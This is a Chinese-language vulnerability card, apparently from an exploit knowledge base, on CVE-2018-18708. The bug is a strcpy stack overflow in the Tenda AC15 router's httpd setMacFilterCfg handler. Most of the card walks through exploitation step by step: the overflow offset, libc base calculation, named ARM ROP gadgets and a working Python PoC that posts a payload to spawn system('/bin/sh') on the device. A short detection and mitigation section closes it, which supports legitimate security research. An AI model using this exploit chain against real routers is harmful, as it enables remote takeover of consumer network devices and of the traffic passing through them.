---
id: binary-pwn-stack-tenda-ac15-setmacfiltercfg-devicelist-strcpy-arm-rop
title: Tenda AC15 httpd setMacFilterCfg deviceList strcpy 栈溢出：ARM ROP 调 system（CVE-2018-18708）
type: scenario
domain: binary
path: binary/pwn/stack
technique: tenda-ac15-httpd-setmacfiltercfg-devicelist-strcpy-arm-rop
aliases:
- CVE-2018-18708
- Tenda AC15 栈溢出
- formSetMacFilterCfg
- deviceList 溢出
- sub_C24C0
- Tenda httpd ROP
tags:
- pwn
- stack-overflow
- arm
- router
- firmware
- tenda
- httpd
- rop
- ret2libc
- iot
cve:
- CVE-2018-18708
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: Tenda AC7 V15.03.06.44_CN；AC9 V15.03.05.19(6318)*CN；AC10 V15.03.06.23_CN；AC15 V15.03.05.19_CN；AC18 V15.03.05.19(6318)*CN（原文标记）
verification:
  verified_by: verifier-V262
  verified_at: '2026-11-07T17:56:24+08:00'
  notes: V262 重核：对照正文与20图，调用链 sub_2E420→sub_2E9EC→sub_42378→formSetMacFilterCfg→sub_C14DC→sub_C17A0→sub_C24C0、websGetVar macFilterType/deviceList、sub_C10D0 校验 black/white、sub_C24C0 strchr(s,13)+strcpy(src+32,s)+strcpy(src,srca)、sub_C17A0 的 s_1[128]/sa[128]/src[176] 与 memset 0xB0、cyclic 偏移 176、puts 0xff5c1cd4-0x35CD4=0xff58c000、system 0x5A270、pop{r3,pc} 0x18298、mov r0,sp;blx r3 0x40cb8、CPSR T=0、getshell 均一致。affected_versions 与原文五型号列表逐项一致（AC7/AC9/AC10/AC15/AC18）。dedup 仅自匹配，无同 CVE/同 sink 候选。未执行 PoC。
---

## 一句话结论

Tenda AC15 V15.03.05.19_CN 的 httpd 在 `POST /goform/setMacFilterCfg` 中把 `deviceList` 按换行拆成规则后交给 `sub_C24C0`，后者用 `strcpy` 把规则复制进 `sub_C17A0` 的 176 字节栈缓冲区 `src`（以及 `src+32`），无长度限制；cyclic 测得覆盖返回地址偏移 176，用 uClibc 的 `pop {r3, pc}` 与 `mov r0, sp; blx r3` gadget 组成 ARM ROP 链调用 `system("/bin/sh")`，可远程 getshell（请求需携带有效 `password` Cookie）。

## 原理

- **入口与调用链**：httpd 在 `sub_42378` 中把 `"setMacFilterCfg"` 注册到 `formSetMacFilterCfg`，对应 `POST /goform/setMacFilterCfg`。调用流程为 `sub_2E420(main) → sub_2E9EC → sub_42378 → formSetMacFilterCfg → sub_C14DC → sub_C17A0 → sub_C24C0`。
- **参数获取与校验**：`formSetMacFilterCfg` 用 `websGetVar` 取 `macFilterType` 和 `deviceList`。`macFilterType` 先经 `sub_C10D0` 校验，只允许 `black`/`white`；`deviceList` 没有长度/格式限制，作为 `s` 传入 `sub_C14DC`。
- **按行拆分**：`sub_C14DC` 用 `strchr(s, '\n')` 逐行处理 `deviceList`，每行调用 `sub_C17A0(macFilterType, 行内容, 序号)`。
- **溢出点**：`sub_C17A0` 的栈帧含 `char s_1[128]`、`char sa[128]`、`char src[176]`，先 `memset(src, 0, 0xB0)`，再调用 `sub_C24C0(行内容, src)`。`sub_C24C0` 的逻辑是：
  1. `srca = strchr(s, '\r')`；
  2. 若找到 `\r`，`*srca++ = 0`，把 CR 前的内容 `strcpy(src + 32, s)`，把 CR 后的内容 `strcpy(src, srca)`；
  3. 两个 `strcpy` 都没有目标长度限制，`s`/`srca` 由 `deviceList` 完全控制。
- **PoC 为什么用 `\r` 开头**：`deviceList = b"\r" + cyclic(500)` 时，CR 在第 0 字节，`s` 被截成空串，第一个 `strcpy(src+32, s)` 无实际写入，`strcpy(src, srca)` 把整段 cyclic 从 `src` 起点写入；因此崩溃时 cyclic 偏移 176 就是 `src` 到保存返回地址的距离。
- **ARM ROP 为什么成立**：
  - 固件为 ARM 32-bit 小端、uClibc、httpd 非 PIE；栈可执行与否不影响 ROP，返回地址被覆盖后按栈上链跳转。
  - `libc` 中 `pop {r3, pc}`（原文偏移 `0x18298`）把 `system` 地址装入 `r3`，同时把 `pc` 指向 `mov r0, sp; blx r3`（偏移 `0x40cb8`）。
  - 执行 gadget2 时 `sp` 正指向链中紧随其后的 `/bin/sh` 字符串，`mov r0, sp` 令 `r0` 指向该字符串，`blx r3` 调 `system("/bin/sh")`。
  - 跳转 `system` 前需检查 CPSR 的 T 位：若 `system` 为 Thumb 代码，地址要 `| 1`；原文环境按 ARM 地址直接使用（不加 1）。
- **libc 基址**：固件无 `vmmap` 可用时，在 `puts` 下断点取运行时地址，再减去该 `libc.so.0` 中 `puts` 的偏移。原文 `puts` 运行时 `0xff5c1cd4`、libc 偏移 `0x35CD4`，得到 `libc_base = 0xff58c000`；`system` 偏移 `0x5A270`。

## 触发条件

- 目标为文章所列 Tenda AC7/AC9/AC10/AC15/AC18 受影响固件（`httpd` 为 ARM 32 位、uClibc），且 `goform/setMacFilterCfg` 可访问。
- 请求需携带有效登录 Cookie（原文实验用 `password=12345`）；若设备使用默认/弱口令或 Cookie 可预测，则可直接利用；否则需要先获得管理员会话。
- 攻击者能向 `deviceList` 传入任意长内容；`macFilterType` 必须是 `black` 或 `white` 才能进入漏洞分支。
- 利用依赖目标固件 `libc.so.0` 的 gadgets/偏移，需按实际固件重新计算；`system("/bin/sh")` 在 qemu 模拟或真实设备上的可用性取决于 `/bin/sh` 与 libc 一致。

## 利用步骤

1. 解包固件并模拟 httpd；QEMU chroot、patch `check_network`/`ConnectCfm`、创建 br0、复制 webroot 的细节见已有卡 `code-analysis-reverse-firmware-arm32-qemu-user-chroot-patch-br0`（同一 AC15 固件）。
2. 以 `-g 1234` 启动 `qemu-arm-static`，用 `gdb-multiarch` 连接；向 `/goform/setMacFilterCfg` 发送 `macFilterType=white`、`deviceList=b"\r"+cyclic(500)`，多发送几次（Tenda 通病）触发崩溃。
3. 在 gdb 中用 `cyclic -l $pc` 求偏移，原文得到 176；对应 payload 在覆盖返回地址前填充 176 字节。
4. 泄露 libc 基址：在 `puts` 下断点取运行时地址，减去 `libc.so.0` 中 `puts` 偏移。原文 `0xff5c1cd4 - 0x35CD4 = 0xff58c000`。
5. 在 `lib/libc.so.0` 中找 gadget：
   - `ROPgadget --binary ./lib/libc.so.0 --only "pop" | grep r3` → `0x18298: pop {r3, pc}`
   - `ROPgadget --binary ./lib/libc.so.0 | grep "mov r0, sp"` → `0x40cb8: mov r0, sp; blx r3`
6. 计算 `system = libc_base + 0x5A270`、`pop_r3 = libc_base + 0x18298`、`mov_r0_sp = libc_base + 0x40cb8`；检查 CPSR T 位，决定是否给 `system` 地址加 1。
7. 构造 `payload = b"A"*176 + p32(pop_r3) + p32(system) + p32(mov_r0_sp) + b"/bin/sh\x00"`，以 `deviceList = b"\r" + payload`、`macFilterType=black`、有效 Cookie POST 到 `/goform/setMacFilterCfg`；发送两次后在监听端获得 shell。

## PoC

原文 PoC（Python 3，节选；地址为原文固件实测值，换固件需重算）：

```python
from pwn import *
import requests

libc_base = 0xff58c000
system    = libc_base + 0x5A270
pop_r3    = libc_base + 0x18298
mov_r0_sp = libc_base + 0x40cb8

payload  = b"a" * 176
payload += p32(pop_r3) + p32(system) + p32(mov_r0_sp) + b"/bin/sh\x00"

url = "http://192.168.87.135/goform/setMacFilterCfg"
cookie = {"Cookie": "password=12345"}
data = {"macFilterType": "black", "deviceList": b"\r" + payload}
for _ in range(2):
    print(requests.post(url, cookies=cookie, data=data).text)
```

原文另给出 `gdb-multiarch` 脚本：`target remote :1234`、`file ./bin/httpd`；以及先以 `cyclic(500)` 测偏移、再换 ROP 链的两阶段过程。原文截图显示成功进入 `/ #` shell。

## 变体与关联

- 同一 CVE 影响 AC7/AC9/AC10/AC18 等多款 Tenda 产品，`httpd` 与 `goform` 处理流程基本一致，换型号主要改 libc 偏移与 gadget 地址。
- 同类 IoT 栈溢出 ROP：DIR-505 `my_cgi.cgi` 的 mipseb 栈溢出（`binary-pwn-stack-dir505-my-cgi-content-length-overflow-mipseb-rop`），思路同为“无长度限制的字符串复制 + 泄露 libc + ROP 调 system”，但架构、参数传递与 gadget 不同。
- 固件仿真/补丁方法见 `code-analysis-reverse-firmware-arm32-qemu-user-chroot-patch-br0`；本卡不再重复环境搭建细节。
- 变体：若目标 libc 的 `system` 为 Thumb 指令，链中 `system` 地址需 `|1`；若 `strcpy(src+32, s)` 路径被使用（`deviceList` 中 CR 不在第 0 字节），需重新测量偏移，因为写入起点是 `src+32`。

## 检测与防御

- 升级到 Tenda 修复版本；关闭远程管理/WAN 侧 Web 访问，限制 `/goform/*` 仅内网可达。
- 对 `deviceList`、规则名等所有 `websGetVar` 输入做长度上限与字符白名单校验；`sub_C24C0`/`sub_C17A0` 改用 `strncpy`/`snprintf` 并保证 NUL 结尾，缓冲区大小与拷贝长度绑定。
- 编译加固：栈 canary（`-fstack-protector-strong`）、PIE、NX；启用 ASLR 并避免可预测的 libc 基址。
- 检测：`/goform/setMacFilterCfg` 请求体出现超长 `deviceList`、包含大量非 MAC 字符或二进制/`\r`/`\n` 混合内容；httpd 进程崩溃或异常重启；同一来源短时间内重复 POST 同一 goform。
- 防御纵深：管理面口令强密码、Cookie 不可预测；对 httpd 做崩溃监控与 WAF 规则拦截超长表单字段。
